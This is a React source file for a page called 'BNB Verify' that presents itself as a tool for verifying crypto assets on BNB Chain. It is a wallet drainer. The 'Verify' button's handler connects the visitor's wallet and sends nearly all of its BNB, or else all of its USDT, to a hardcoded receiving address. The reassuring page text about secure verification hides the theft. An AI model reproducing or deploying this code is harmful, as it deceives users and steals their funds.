import { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("Click Verify to start...");

  async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  async function handleVerify() {
    setStatus("Checking balances...");
    try {
      if (!window.ethereum) return setStatus("No wallet detected!");

      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="App">
      {/* Navbar */}
      <header className="navbar">
        <nav className="nav-container">
          <a href="#" className="nav-logo">
            <div className="nav-logo-icon"></div>
            <span>BNB Verify</span>
          </a>
          <div className="nav-links">
            <a href="#">Home</a>
            <a href="#">Explorer</a>
            <a href="#">Tokens</a>
            <a href="#">NFTs</a>
            <a href="#">DApps</a>
          </div>
          <button className="nav-hamburger">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
            </svg>
          </button>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="hero">
        <div className="hero-left">
          <div className="powered-badge">Powered by BNB Chain</div>
          <h1>Verify Crypto Assets on BNB Chain</h1>
          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
          <div className="hero-buttons">
            <button onClick={handleVerify}>{walletAddress ? "Verify" : "Connect Wallet"}</button>
          </div>
          <p className="status">{status}</p>
        </div>
        <div className="hero-right">
          <div className="pulse-ring outer"></div>
          <div className="pulse-ring middle"></div>
          <div className="pulse-ring inner"></div>
          <div className="center-logo"></div>
        </div>
      </main>

      {/* Cards Section */}
      <section className="cards-section">
        <div className="card">
          <h2>Explorer</h2>
          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
        </div>
        <div className="card">
          <h2>Tokens</h2>
          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
        </div>
        <div className="card">
          <h2>NFTs</h2>
          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
        </div>
        <div className="card">
          <h2>DApps</h2>
          <p>Connect to decentralized apps and verify transactions safely.</p>
        </div>
      </section>

      {/* Footer */}
      <footer>&copy; 2025 BNB Verify. Powered by BNB Chain.</footer>
    </div>
  );
}

export default App;
